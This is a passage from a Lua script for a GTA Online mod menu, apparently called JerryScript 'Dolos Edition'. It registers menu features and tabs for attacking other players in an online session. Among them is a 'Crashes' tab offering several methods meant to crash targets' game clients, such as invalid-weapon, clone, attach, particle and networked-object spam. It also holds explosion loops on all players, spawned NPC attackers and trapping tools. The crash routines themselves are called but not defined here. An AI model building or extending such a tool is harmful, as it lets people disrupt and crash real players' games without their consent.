        SelfSettings.fireBreathEnabled = f:IsToggled()
    end)

FeatureMgr.AddFeature(Utils.Joaat("JS_FireBreathScale"), "Fire Breath Scale", eFeatureType.SliderInt,
    "Size of fire breath (÷10)", function(f)
        SelfSettings.fireBreathScale = f:GetIntValue()
    end)
local fbScale = FeatureMgr.GetFeature(Utils.Joaat("JS_FireBreathScale"))
if fbScale then fbScale:SetLimitValues(1, 30); fbScale:SetValue(3) end

-- Weapon Features
FeatureMgr.AddFeature(Utils.Joaat("JS_NukeGun"), "Nuke Gun [BROKEN]", eFeatureType.Toggle,
    "[BROKEN - raycasting not working] Homing launcher/RPG fires nukes", function(f)
        WeaponSettings.nukeGun = f:IsToggled()
        if f:IsToggled() then toast(SCRIPT_NAME, "Nuke Gun ON (may not work)") end
    end)

FeatureMgr.AddFeature(Utils.Joaat("JS_NukeWaypoint"), "Nuke Waypoint", eFeatureType.Button,
    "Drop nuke at waypoint", function(f) nukeWaypoint() end)

FeatureMgr.AddFeature(Utils.Joaat("JS_NukeHeight"), "Nuke Height", eFeatureType.SliderInt,
    "Height of nuke mushroom cloud", function(f)
        WeaponSettings.nukeHeight = f:GetIntValue()
    end)
local nukeH = FeatureMgr.GetFeature(Utils.Joaat("JS_NukeHeight"))
if nukeH then nukeH:SetLimitValues(10, 100); nukeH:SetValue(40) end

-- Explosion Settings (GLOBAL - affects base behavior)
FeatureMgr.AddFeature(Utils.Joaat("JS_ExpAudible"), "Audible Explosions", eFeatureType.Toggle,
    "Explosions make sound", function(f) ExplosionSettings.audible = f:IsToggled() end)
local expAud = FeatureMgr.GetFeature(Utils.Joaat("JS_ExpAudible"))
if expAud then expAud:SetValue(true) end

FeatureMgr.AddFeature(Utils.Joaat("JS_ExpInvisible"), "Invisible Explosions", eFeatureType.Toggle,
    "Hide explosion visuals", function(f) ExplosionSettings.invisible = f:IsToggled() end)

FeatureMgr.AddFeature(Utils.Joaat("JS_ExpOwned"), "Owned Explosions", eFeatureType.Toggle,
    "Explosions count as yours (fixed!)", function(f) ExplosionSettings.owned = f:IsToggled() end)
local expOwned = FeatureMgr.GetFeature(Utils.Joaat("JS_ExpOwned"))
if expOwned then expOwned:SetValue(true) end

-- All Players
FeatureMgr.AddFeature(Utils.Joaat("JS_ExplodeAllLoop"), "Explode All (Loop)", eFeatureType.Toggle,
    "Continuously explode all players", function(f)
        State.explodeAllLoop = f:IsToggled()
    end)

FeatureMgr.AddFeature(Utils.Joaat("JS_ClearSpawned"), "Clear Spawned", eFeatureType.Button,
    "Delete all spawned entities", function(f)
        for i = #State.spawnedEntities, 1, -1 do
            pcall(function() deleteEntity(State.spawnedEntities[i]) end)
            table.remove(State.spawnedEntities, i)
        end
        toast(SCRIPT_NAME, "Cleared entities!")
    end)

-- Settings
FeatureMgr.AddFeature(Utils.Joaat("JS_Notifications"), "Notifications", eFeatureType.Toggle,
    "Show toast notifications", function(f) Settings.notifications = f:IsToggled() end)
local notif = FeatureMgr.GetFeature(Utils.Joaat("JS_Notifications"))
if notif then notif:SetValue(true) end

-- YEET Settings
FeatureMgr.AddFeature(Utils.Joaat("JS_YeetRange"), "YEET Range", eFeatureType.SliderInt,
    "Range for Entity YEET/Storm", function(f) YeetSettings.range = f:GetIntValue() end)
local yeetRange = FeatureMgr.GetFeature(Utils.Joaat("JS_YeetRange"))
if yeetRange then yeetRange:SetLimitValues(10, 200); yeetRange:SetValue(100) end

FeatureMgr.AddFeature(Utils.Joaat("JS_YeetMult"), "YEET Multiplier", eFeatureType.SliderInt,
    "Force multiplier for YEET", function(f) YeetSettings.multiplier = f:GetIntValue() end)
local yeetMult = FeatureMgr.GetFeature(Utils.Joaat("JS_YeetMult"))
if yeetMult then yeetMult:SetLimitValues(1, 20); yeetMult:SetValue(5) end

-- ═══════════════════════════════════════════════════════════════════════════
-- PLAYER FEATURES (Per-player)
-- ═══════════════════════════════════════════════════════════════════════════

-- Attack
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PExplode"), "Explode", eFeatureType.Button,
    "Explode player (50 rapid)", function(f)
        explodePlayer(f:GetPlayerIndex(), false)
        toast(SCRIPT_NAME, "Exploding!")
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PExpLoop"), "Explosion Loop", eFeatureType.Toggle,
    "Continuous explosions", function(f)
        State.explosionLoopTargets[f:GetPlayerIndex()] = f:IsToggled()
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PRagdoll"), "Ragdoll", eFeatureType.Button,
    "Make player ragdoll", function(f)
        ragdollPlayer(f:GetPlayerIndex())
    end)

-- Explosion Type PER PLAYER (moved here!)
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PExpType"), "Explosion Type", eFeatureType.SliderInt,
    "0=Grenade, 7=Car, 59=Orbital, 82=Blimp", function(f)
        PlayerExplosionType[f:GetPlayerIndex()] = f:GetIntValue()
    end)

-- Vehicle
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PLaunchUp"), "Launch Up", eFeatureType.Button,
    "Launch vehicle upward", function(f)
        LaunchVehicle(f:GetPlayerIndex(), "up", 100)
        toast(SCRIPT_NAME, "Launched up!")
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PLaunchFwd"), "Launch Forward", eFeatureType.Button,
    "Launch vehicle forward", function(f)
        LaunchVehicle(f:GetPlayerIndex(), "forward", 100)
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PToTheMoon"), "To The Moon", eFeatureType.Toggle,
    "Continuous upward force (FIXED)", function(f)
        ToTheMoon(f:GetPlayerIndex(), f:IsToggled())
        if f:IsToggled() then toast(SCRIPT_NAME, "To The Moon! 🚀") end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PAnchor"), "Anchor", eFeatureType.Toggle,
    "Force vehicle to ground", function(f)
        Anchor(f:GetPlayerIndex(), f:IsToggled())
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PLockBurnout"), "Lock Burnout", eFeatureType.Toggle,
    "Lock in burnout", function(f)
        State.burnoutTargets[f:GetPlayerIndex()] = f:IsToggled()
    end)

-- Cage (only stunt tube works)
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PCageStunt"), "Stunt Tube Cage", eFeatureType.Button,
    "Trap in stunt tube", function(f) spawnCage(f:GetPlayerIndex(), "stunt") end)

-- IW Crash (Invalid Weapon crash)
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_IWCrash"), "IW Crash", eFeatureType.Button,
    "Invalid weapon crash method", function(f)
        IWCrash(f:GetPlayerIndex())
    end)

-- Infinite Weapon Crash (Enhanced IW)
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_InfWeaponCrash"), "IW Crash v2", eFeatureType.Button,
    "Enhanced IW with multiple weapons", function(f)
        InfiniteWeaponCrash(f:GetPlayerIndex())
    end)

-- Clone Crash
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_CloneCrash"), "Clone Crash", eFeatureType.Button,
    "30 clones attached in chain", function(f)
        CloneCrash(f:GetPlayerIndex())
    end)

-- Attach Crash
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AttachCrash"), "Attach Crash", eFeatureType.Button,
    "20 objects attached to bones", function(f)
        AttachCrash(f:GetPlayerIndex())
    end)

-- Vehicle Attach Crash
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_VehAttachCrash"), "Vehicle Attach", eFeatureType.Button,
    "5 tanks attached to player", function(f)
        VehicleAttachCrash(f:GetPlayerIndex())
    end)

-- Ragdoll Spam
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_RagdollSpam"), "Ragdoll Spam", eFeatureType.Button,
    "30 ragdolling peds at target", function(f)
        RagdollSpam(f:GetPlayerIndex())
    end)

-- Particle Crash
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_ParticleCrash"), "Particle Crash", eFeatureType.Button,
    "100 particle effects spam", function(f)
        ParticleCrash(f:GetPlayerIndex())
    end)

-- Cage Explosion
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_CageExplosion"), "Cage Explosion", eFeatureType.Button,
    "Trap and explode repeatedly", function(f)
        CageExplosion(f:GetPlayerIndex())
    end)

-- Net Object Spam
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_NetObjSpam"), "Net Object Spam", eFeatureType.Button,
    "50 networked objects spam", function(f)
        NetObjectSpam(f:GetPlayerIndex())
    end)

-- Glitch Bomb
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_GlitchBomb"), "Glitch Bomb", eFeatureType.Button,
    "Multiple chaos effects at once", function(f)
        GlitchBomb(f:GetPlayerIndex())
    end)

-- Black Hole Toggle
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_BlackHole"), "Black Hole", eFeatureType.Toggle,
    "Pull all entities toward player", function(f)
        BlackHoleTargets[f:GetPlayerIndex()] = f:IsToggled()
        if f:IsToggled() then toast(SCRIPT_NAME, "Black Hole ON!") end
    end)

-- Ped Launcher Toggle
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PedLauncher"), "Ped Launcher", eFeatureType.Toggle,
    "Launch traffic peds at target", function(f)
        PedLauncherTargets[f:GetPlayerIndex()] = f:IsToggled()
        if f:IsToggled() then toast(SCRIPT_NAME, "Ped Launcher ON!") end
    end)

-- Ragdoll Loop Toggle
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_RagdollLoop"), "Ragdoll Loop", eFeatureType.Toggle,
    "Keep target in permanent ragdoll", function(f)
        RagdollTargets[f:GetPlayerIndex()] = f:IsToggled()
        if f:IsToggled() then toast(SCRIPT_NAME, "Ragdoll Loop ON!") end
    end)

-- Trolling
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PPrimedGrenade"), "Primed Grenade", eFeatureType.Button,
    "Spawn primed grenade", function(f) SpawnPrimedGrenade(f:GetPlayerIndex()) end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PStickyBomb"), "Sticky Bomb", eFeatureType.Button,
    "Attach sticky bomb", function(f) SpawnStickyOnPlayer(f:GetPlayerIndex()) end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PEntityYeet"), "Entity YEET", eFeatureType.Button,
    "Yeet nearby entities into player (FIXED)", function(f)
        EntityYeet(f:GetPlayerIndex())
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PEntityStorm"), "Entity Storm", eFeatureType.Toggle,
    "Continuous entity YEET", function(f)
        State.entityStormTargets[f:GetPlayerIndex()] = f:IsToggled()
        if f:IsToggled() then toast(SCRIPT_NAME, "Entity Storm ON!") end
    end)

-- ═══════════════════════════════════════════════════════════════════════════
-- DOLOS ATTACKER FEATURES
-- ═══════════════════════════════════════════════════════════════════════════

-- Delete Attackers
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_DeleteAttackers"), "Delete Attackers", eFeatureType.Button,
    "Delete all spawned attackers for this player", function(f)
        deleteAttackers(f:GetPlayerIndex())
        toast(SCRIPT_NAME, "Attackers deleted!")
    end)

-- Ground Infantry Attackers
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkZombie"), "Zombie Attack", eFeatureType.Button,
    "Send zombie attackers", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendGroundAttacker(f:GetPlayerIndex(), Utils.Joaat("U_M_Y_Zombie_01"), 0)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkChimp"), "Chimp Attack", eFeatureType.Button,
    "Send angry chimps", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendGroundAttacker(f:GetPlayerIndex(), Utils.Joaat("a_c_chimp_02"), 0)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkPug"), "Pug Attack", eFeatureType.Button,
    "Send hell pugs", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendGroundAttacker(f:GetPlayerIndex(), Utils.Joaat("a_c_pug_02"), 0)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkCoyote"), "Coyote Attack", eFeatureType.Button,
    "Send hell hounds", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendGroundAttacker(f:GetPlayerIndex(), Utils.Joaat("a_c_coyote_02"), 0)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkHobo"), "Hobo Shank", eFeatureType.Button,
    "Send hobo with knife", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendGroundAttacker(f:GetPlayerIndex(), Utils.Joaat("a_m_o_tramp_01"), WEAPON_KNIFE)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkSlasher"), "Slasher Attack", eFeatureType.Button,
    "Send slasher with knife", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendGroundAttacker(f:GetPlayerIndex(), Utils.Joaat("G_M_M_Slasher_01"), WEAPON_KNIFE)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkCop"), "Cop Attack", eFeatureType.Button,
    "Send armed cop", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendGroundAttacker(f:GetPlayerIndex(), Utils.Joaat("s_m_y_cop_01"), AttackerSettings.weapon)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkSWAT"), "SWAT Attack", eFeatureType.Button,
    "Send armed SWAT", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendGroundAttacker(f:GetPlayerIndex(), Utils.Joaat("s_m_y_swat_01"), WEAPON_MINIGUN)
        end
    end)

-- Vehicle Attackers
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkLazer"), "Scramble Lazer", eFeatureType.Button,
    "Send Lazer jet after player", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendVehicleAttacker(f:GetPlayerIndex(), Utils.Joaat("s_m_m_pilot_02"), Utils.Joaat("lazer"), true)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkA10"), "Scramble A-10", eFeatureType.Button,
    "Send Strikeforce after player", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendVehicleAttacker(f:GetPlayerIndex(), Utils.Joaat("s_m_m_pilot_02"), Utils.Joaat("strikeforce"), true)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkOppressor"), "Oppressor MK2", eFeatureType.Button,
    "Send Oppressor MK2 attacker", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendVehicleAttacker(f:GetPlayerIndex(), Utils.Joaat("s_m_m_autoshop_01"), Utils.Joaat("oppressor2"), true)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkKhanjali"), "Khanjali Tank", eFeatureType.Button,
    "Send Khanjali tank attacker", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendVehicleAttacker(f:GetPlayerIndex(), Utils.Joaat("s_m_m_autoshop_01"), Utils.Joaat("khanjali"), false)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkKuruma"), "Armored Kuruma", eFeatureType.Button,
    "Send Kuruma attacker", function(f)
        for i = 1, AttackerSettings.numAttackers do
            sendVehicleAttacker(f:GetPlayerIndex(), Utils.Joaat("s_m_m_autoshop_01"), Utils.Joaat("kuruma2"), false)
        end
    end)

-- Misc Trolls
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_TrollDoritos"), "Rain Doritos", eFeatureType.Button,
    "Rain doritos on player", function(f)
        rainObjects(f:GetPlayerIndex(), Utils.Joaat("xs_prop_nacho_wl"), 5)
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_TrollCorpse"), "Rain Corpses", eFeatureType.Button,
    "Rain corpses on player", function(f)
        rainObjects(f:GetPlayerIndex(), Utils.Joaat("xm_prop_x17_corpse_01"), 5)
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_TrollChill"), "Chill Out", eFeatureType.Button,
    "Spawn fan in their face", function(f)
        chillOut(f:GetPlayerIndex())
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_TrollEarthquake"), "Earthquake", eFeatureType.Toggle,
    "Constant earthquake around player", function(f)
        EarthquakeTargets[f:GetPlayerIndex()] = f:IsToggled()
        if f:IsToggled() then toast(SCRIPT_NAME, "Earthquake ON!") end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_TrollPtfxSpam"), "PTFX Spam", eFeatureType.Toggle,
    "Spam particle effects on player", function(f)
        PtfxSpamTargets[f:GetPlayerIndex()] = f:IsToggled()
        if f:IsToggled() then 
            local fx = PtfxEffects[PtfxSpamType[f:GetPlayerIndex()] or 2] or PtfxEffects[2]
            toast(SCRIPT_NAME, "PTFX: " .. fx.name)
        end
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_TrollPtfxType"), "PTFX Effect", eFeatureType.SliderInt,
    "1=Clown 2=Fire 3=Slam 4=Water 5=Spark 6=Smoke 7=Blood 8=Confetti", function(f)
        PtfxSpamType[f:GetPlayerIndex()] = f:GetIntValue()
        local fx = PtfxEffects[f:GetIntValue()] or PtfxEffects[2]
        toast(SCRIPT_NAME, "PTFX: " .. fx.name)
    end)

-- AA Turret Attacker
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AtkAATurret"), "AA Turret", eFeatureType.Button,
    "Spawn Anti-Aircraft turret to attack player", function(f)
        spawnAATurret(f:GetPlayerIndex())
    end)

-- Vehicle Trolling Features
FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_VehCatapult"), "Catapult Vehicle", eFeatureType.Button,
    "Launch vehicle forward with spin", function(f)
        catapultVehicle(f:GetPlayerIndex())
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_VehFlip"), "Flip Vehicle", eFeatureType.Button,
    "Flip vehicle upside down", function(f)
        flipVehicle(f:GetPlayerIndex())
    end)

FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_VehSpin"), "Spin Vehicle", eFeatureType.Toggle,
    "Continuously spin player's vehicle", function(f)
        SpinVehicleTargets[f:GetPlayerIndex()] = f:IsToggled()
        if f:IsToggled() then toast(SCRIPT_NAME, "Spin ON!") end
    end)

-- ═══════════════════════════════════════════════════════════════════════════
-- GUI REGISTRATION
-- ═══════════════════════════════════════════════════════════════════════════

ClickGUI.AddTab("JerryScript", function()
    if ClickGUI.BeginCustomChildWindow("Self") then
        ClickGUI.RenderFeature(Utils.Joaat("JS_FireWings"))
        ClickGUI.RenderFeature(Utils.Joaat("JS_FireWingsScale"))
        ClickGUI.RenderFeature(Utils.Joaat("JS_FireBreath"))
        ClickGUI.RenderFeature(Utils.Joaat("JS_FireBreathScale"))
        ClickGUI.EndCustomChildWindow()
    end
    
    if ClickGUI.BeginCustomChildWindow("Weapons") then
        ClickGUI.RenderFeature(Utils.Joaat("JS_NukeGun"))
        ClickGUI.RenderFeature(Utils.Joaat("JS_NukeWaypoint"))
        ClickGUI.RenderFeature(Utils.Joaat("JS_NukeHeight"))
        ClickGUI.EndCustomChildWindow()
    end
    
    if ClickGUI.BeginCustomChildWindow("Explosion Settings") then
        ClickGUI.RenderFeature(Utils.Joaat("JS_ExpAudible"))
        ClickGUI.RenderFeature(Utils.Joaat("JS_ExpInvisible"))
        ClickGUI.RenderFeature(Utils.Joaat("JS_ExpOwned"))
        ClickGUI.EndCustomChildWindow()
    end
    
    if ClickGUI.BeginCustomChildWindow("Entity YEET Settings") then
        ClickGUI.RenderFeature(Utils.Joaat("JS_YeetRange"))
        ClickGUI.RenderFeature(Utils.Joaat("JS_YeetMult"))
        ClickGUI.EndCustomChildWindow()
    end
    
    if ClickGUI.BeginCustomChildWindow("All Players") then
        ClickGUI.RenderFeature(Utils.Joaat("JS_ExplodeAllLoop"))
        ClickGUI.RenderFeature(Utils.Joaat("JS_ClearSpawned"))
        ClickGUI.EndCustomChildWindow()
    end
    
    if ClickGUI.BeginCustomChildWindow("Settings") then
        ClickGUI.RenderFeature(Utils.Joaat("JS_Notifications"))
        ClickGUI.EndCustomChildWindow()
    end
end)

-- ═══════════════════════════════════════════════════════════════════════════
-- PLAYER TAB - Uses ImGui TabBar for horizontal sub-tabs like Trolley
-- Creates clickable tabs: Attacks | Vehicle | Land | Air | Trolling | Chaos
-- ═══════════════════════════════════════════════════════════════════════════

ClickGUI.AddPlayerTab("JerryScript", function()
    local pid = Utils.GetSelectedPlayer()
    
    -- Create horizontal tab bar like Trolley
    if ImGui.BeginTabBar("JerryTabs") then
        
        -- ═══ CRASHES TAB ═══ (v10.5 - Entity-based methods)
        if ImGui.BeginTabItem("Crashes") then
            ClickGUI.RenderFeature(Utils.Joaat("JS_IWCrash"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_InfWeaponCrash"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_CloneCrash"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AttachCrash"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_VehAttachCrash"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_RagdollSpam"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_ParticleCrash"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_CageExplosion"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_NetObjSpam"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_GlitchBomb"), pid)
            ImGui.EndTabItem()
        end
        
        -- ═══ ATTACKS TAB ═══
        if ImGui.BeginTabItem("Attacks") then
            ClickGUI.RenderFeature(Utils.Joaat("JS_PExplode"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_PExpLoop"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_PExpType"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_PRagdoll"), pid)
            ImGui.EndTabItem()
        end
        
        -- ═══ VEHICLE TAB ═══
        if ImGui.BeginTabItem("Vehicle") then
            ClickGUI.RenderFeature(Utils.Joaat("JS_VehCatapult"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_VehFlip"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_VehSpin"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_PLaunchUp"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_PLaunchFwd"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_PToTheMoon"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_PAnchor"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_PLockBurnout"), pid)
            ImGui.EndTabItem()
        end
        
        -- ═══ LAND ATTACKERS TAB ═══
        if ImGui.BeginTabItem("Land") then
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkZombie"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkChimp"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkPug"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkCoyote"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkHobo"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkSlasher"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkCop"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkSWAT"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkAATurret"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_DeleteAttackers"), pid)
            ImGui.EndTabItem()
        end
        
        -- ═══ AIR ATTACKERS TAB ═══
        if ImGui.BeginTabItem("Air") then
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkLazer"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkA10"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkOppressor"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkKhanjali"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_AtkKuruma"), pid)
            ImGui.EndTabItem()
        end
        
        -- ═══ CHAOS TAB ═══ (NEW!)
        if ImGui.BeginTabItem("Chaos") then
            ClickGUI.RenderFeature(Utils.Joaat("JS_BlackHole"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_PedLauncher"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_RagdollLoop"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_PEntityYeet"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_PEntityStorm"), pid)
            ImGui.EndTabItem()
        end
        
        -- ═══ TROLLING TAB ═══
        if ImGui.BeginTabItem("Trolling") then
            ClickGUI.RenderFeature(Utils.Joaat("JS_PCageStunt"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_TrollChill"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_TrollEarthquake"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_TrollPtfxSpam"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_TrollPtfxType"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_TrollDoritos"), pid)
            ClickGUI.RenderFeature(Utils.Joaat("JS_TrollCorpse"), pid)
            ImGui.EndTabItem()
        end
        
        ImGui.EndTabBar()
    end
end)

-- ═══════════════════════════════════════════════════════════════════════════
-- EVENT HANDLERS
-- ═══════════════════════════════════════════════════════════════════════════

EventMgr.RegisterHandler(eLuaEvent.ON_PLAYER_LEFT, function(pid)
    State.explosionLoopTargets[pid] = nil
    State.vehicleLoops[pid] = nil
    State.burnoutTargets[pid] = nil
    State.entityStormTargets[pid] = nil
    PlayerExplosionType[pid] = nil
    EarthquakeTargets[pid] = nil
    PtfxSpamTargets[pid] = nil
    PtfxSpamType[pid] = nil
    SpinVehicleTargets[pid] = nil
    BlackHoleTargets[pid] = nil
    PedLauncherTargets[pid] = nil
    RagdollTargets[pid] = nil
    
    -- Clean up attackers for this player
    deleteAttackers(pid)
end)

EventMgr.RegisterHandler(eLuaEvent.Unload, function()
    WeaponSettings.nukeGun = false
    SelfSettings.fireWingsEnabled = false
    SelfSettings.fireBreathEnabled = false
    State.explodeAllLoop = false
    
    -- Clear all attackers
    for pid, _ in pairs(AttackersByPid) do
        deleteAttackers(pid)
    end
    
    for i = #State.spawnedEntities, 1, -1 do
        pcall(function() deleteEntity(State.spawnedEntities[i]) end)
    end
    State.spawnedEntities = {}
    
    log("Script unloaded - cleaned up")
end)

-- ═══════════════════════════════════════════════════════════════════════════
-- INITIALIZATION
-- ═══════════════════════════════════════════════════════════════════════════

-- Configure per-player sliders using GetFeature with index parameter
Script.QueueJob(function()
    Script.Yield(100)  -- Wait for features to register
    for i = 0, 31 do  -- Max 32 players
        -- Explosion type slider
        local expF = FeatureMgr.GetFeature(Utils.Joaat("JS_PExpType"), i)
        if expF then
            expF:SetLimitValues(0, 82)
            expF:SetValue(7)
        end
        
        -- PTFX type slider (1-8)
        local ptfxF = FeatureMgr.GetFeature(Utils.Joaat("JS_TrollPtfxType"), i)
        if ptfxF then
            ptfxF:SetLimitValues(1, 8)
            ptfxF:SetValue(2)  -- Default to Fire
        end
    end
end)

log("═══════════════════════════════════════════════════════════════")
log(" " .. SCRIPT_NAME .. " v" .. SCRIPT_VERSION .. " - DOLOS EDITION")
log("═══════════════════════════════════════════════════════════════")
log(" FIXES IN 10.6:")
log("   ✓ IW Crash v2 - Now SAFE (won't crash your game)")
log("   ✓ Entity Storm - INSANE swirl + launch effect!")
log("   ✓ Removed duplicate Chaos tab")
log("   ✓ Attach Crash - Fixed spawn location")
log("   ✓ Faster Entity Storm tick (50ms)")
log(" CRASH METHODS: IW, IWv2, Clone, Attach, VehAttach,")
log("   Ragdoll, Particle, Cage, NetObj, GlitchBomb")
log("═══════════════════════════════════════════════════════════════")

GUI.AddToast(SCRIPT_NAME, "v" .. SCRIPT_VERSION .. " - STORM FIXED! 🌪️", 4000, eToastPos.TopRight)
